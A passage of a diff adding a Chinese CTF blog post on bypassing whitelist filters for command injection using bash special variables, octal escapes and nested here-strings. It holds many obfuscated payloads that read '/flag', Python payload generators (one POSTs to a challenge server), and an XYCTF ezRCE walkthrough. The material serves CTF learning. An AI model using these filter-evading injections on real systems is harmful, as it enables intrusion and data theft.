也是可以执行的</span><br></pre></td></tr></table></figure>
+
+<p>这里说明了<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现的<code>$&#39;\154\163&#39;</code>都是可用的，虽然本来就是一样的。</p>
+<p>现在回到原先的问题，刚好证明了，这里使用更简单的构造，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603150736801.png" alt="image-20240603150736801"></p>
+<p>这个事实就可以充分地说明在这个构造方法中最终利用的payload确实是如文章所说：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls /&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>现在结合事实再来想想</strong>，估计就是因为在上面说过的最后结果会被当做字符串，这里为了与shell命令区分开，所以是<code>bash&lt;&lt;&lt;&quot;&#39;ls /&#39;&quot;</code>，中间的单引号表示的就是这是一个字符串，注意思考，区分<code>bash&lt;&lt;&lt;&quot;ls /&quot;</code>这两者的不同</p>
+<p><strong>那现在就继续跟文章</strong></p>
+<p>而出现这个结果的原因应该还是字符串问题，<strong>这阻止了<code>bash</code>用空格分隔参数，</strong></p>
+<p>我们只需使用上述方法运行<code>bash -c</code>，并将最终命令作为参数。这样，<strong>第二次 bash 调用就会进行参数分离</strong>。</p>
+<p>为了在<code>bash</code>和之间放置空格字符<code>-c</code>，我们使用括号扩展：<code>&#123;bash,-c&#125;</code>。这会扩展为带有空格的字符串。</p>
+<p>最终构造地paylaod：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&#123;bash，-c，ls -l&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>那么发散一下，也就是再调用一下bash嘛，那么我尝试再用一次<code>&lt;&lt;&lt;</code>呢</strong>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br><span class="line">注意防止转义</span><br></pre></td></tr></table></figure>
+
+<p>成功执行，<strong>同时注意主要还是用这个</strong></p>
+<h4 id="其它的利用"><a href="#其它的利用" class="headerlink" title="其它的利用"></a>其它的利用</h4><p>其他的博主由此也提出了新的利用方法，参考<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-1">文章</a></p>
+<h5 id="shell脚本中-的多种用法"><a href="#shell脚本中-的多种用法" class="headerlink" title="shell脚本中$的多种用法"></a>shell脚本中$的多种用法</h5><p>shell脚本中<code>$</code>的多种用法（例子可参考<a href="https://blog.csdn.net/ly_qiu/article/details/105765772">文章</a>）：</p>
+<table>
+<thead>
+<tr>
+<th>变量名</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>脚本本身的名字</td>
+</tr>
+<tr>
+<td>$1</td>
+<td>脚本后所输入的第一串字符</td>
+</tr>
+<tr>
+<td>$2</td>
+<td>传递给该shell脚本的第二个参数</td>
+</tr>
+<tr>
+<td>$*</td>
+<td>脚本后所输入的所有字符</td>
+</tr>
+<tr>
+<td>$@</td>
+<td>脚本后所输入的所有字符</td>
+</tr>
+<tr>
+<td>$_</td>
+<td>表示上一个命令的最后一个参数</td>
+</tr>
+<tr>
+<td>$#</td>
+<td>#脚本后所输入的字符串个数</td>
+</tr>
+<tr>
+<td>$$</td>
+<td>脚本运行的当前进程ID号</td>
+</tr>
+<tr>
+<td>$!</td>
+<td>表示最后执行的后台命令的PID</td>
+</tr>
+<tr>
+<td>$?</td>
+<td>显示最后命令的退出状态，0表示没有错误，其他表示有错误</td>
+</tr>
+</tbody></table>
+<h5 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用<code>$#</code>构造</h5><p>本质就是和上面启程部分说的那个一样，但是有可能<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来，可以将其换一种形式：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165448778.png" alt="image-20240603165448778"></p>
+<p>加了变量$__作为过渡，减少了解析的过程。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag</span><br><span class="line">__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用的脚本:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用 $(()) 构造"></a>利用 $(()) 构造</h5><p>这个刚刚好上面记录到有这个吗，可以使用<code>$(())</code>来构造任意数字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>自己尝试按照<code>$#</code>那种方法来构造，比如ls</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br><span class="line"></span><br><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br><span class="line"></span><br><span class="line">相对应的： $((~$((~$(($(())))$((~$(())))))))$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())</span><br><span class="line"></span><br><span class="line">$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>在终端输出看一下，均成功构造。不要构造了，到后面的加入<code>#</code>运用是错的，但还是可以自己去构造着试试。</p>
+<p>去看了一下<a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow的极限rce的level5</a>，茅塞顿开，<u>我的思维又局限了</u>，已经可以构造出来十进制的字符串了，还干嘛费心费力去转二进制然后回十进制，变通，<strong>强调脑子要变通</strong>，那么就如下构造一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那现在需要的就是1、 5 、4 、6 、3</span><br><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>再传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功构造出：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603191723486.png" alt="image-20240603191723486"></p>
+<p>这个同样有字符串那个问题，原因在本篇文章第一次提出这个问题给的参考那里有说，个人理解大概就是对于一个shell变量只进行一次，所以最后构造出来的<code>$&#39;&#39;</code>不会再运行。</p>
+<p>解决方法同样使用两次bash，先试试，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后传入成功执行<code>ls</code>，那么如何利用这个构造<code>bash</code>呢，不能只是简单的<code>$</code>+<code>$(())</code>，这样就算传进去也只会导致两个<code>$$</code>执行查看进程的命令，那么该如何构造呢，文章提出了思路：</p>
+<p>我们已知<code>$&#123;!#&#125;</code>输出为bash，结合间接引用<code>$&#123;!var&#125; -间接引用</code>的说明，在这里我们并没有对<code>#</code>这个赋值，却可以输出<code>bash</code>，那么我们是否可以猜测只要是没有值的参数，在这里都可以拿到<code>bash</code>这个输出，测试一下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603203638487.png" alt="image-20240603203638487"></p>
+<p>在这张图片中，**可以看到<code>$&#123;!?&#125;</code>也是输出的<code>bash</code>**，虽然不知道为什么<code>$&#123;!0&#125;</code>没有输出（可能是因为是数字），但是可以采用第三个方法输出。这三个思路就是文章提出的，个人感觉还是挺精妙的</p>
+<p>所以在这里仅能通过<strong>定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0</strong>，<strong>然后通过<code>$&#123;!__&#125;</code>的形式拿到<code>sh/bash</code>字符</strong>。两条命令间通过<code>&amp;&amp;(应该也可以使用 ; )</code>进行连接。由于bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。所以这里是<code>__</code>作为变量名。</p>
+<p>最终<code>ls</code>的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>wc，又是这个问题，宝塔linux本地只能用<code>bash</code>，换到centos跑一下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204738674.png" alt="image-20240603204738674"></p>
+<p>成功执行，其他的payload构造也是同理。</p>
+<p>官方wp给了脚本（偷个懒），如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#level5</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>来看看博主的方法</strong>，<code>$(())</code>对应0，使用自增构造出了1，2这两个数字。</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165230257.png" alt="image-20240603165230257"></p>
+<p>payload如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /flag</span></span><br><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>自增需要抓包后url编码传参</strong></p>
+<p>可以使用脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用 $? 构造"></a>利用 $? 构造</h5><p>正如上面说的，只要我们找到一个代表值为零的变量就可以得到bash进而继续构造，需要的值为<code>0</code>、<code>1</code>，2可以由<code>&lt;&lt;</code>得到</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603161335061.png" alt="image-20240603161335061"></p>
+<p>，这里只要最后的命令的推出状态没有错误就可以得到0，但是1就不能得到了，可以使用自增运算，如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag:</span><br><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>自增运算时传参需要url编码一下。</strong></p>
+<p>利用脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>自增等后面再来研究</p>
+<h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="XYCTF-2024-ezRCE"><a href="#XYCTF-2024-ezRCE" class="headerlink" title="XYCTF 2024 - ezRCE"></a>XYCTF 2024 - ezRCE</h6><p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>
+
+<p>就是考的八进制数据，没有禁<code>&#39;</code>，先尝试直接<code>ls</code>，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180726080.png" alt="image-20240603180726080"></p>
+<p>读取根目录（<code>ls /</code>），可以如下构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt;$&#x27;\154\163\40\57&#x27;</span><br><span class="line">$0&lt;&lt;&lt;\$0\&lt;\&lt;\&lt;\$\&#x27;\\154\\163\\40\\57\&#x27;</span><br><span class="line">防止转义</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180945707.png" alt="image-20240603180945707"></p>
+<p>最后读flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>读到flag</p>
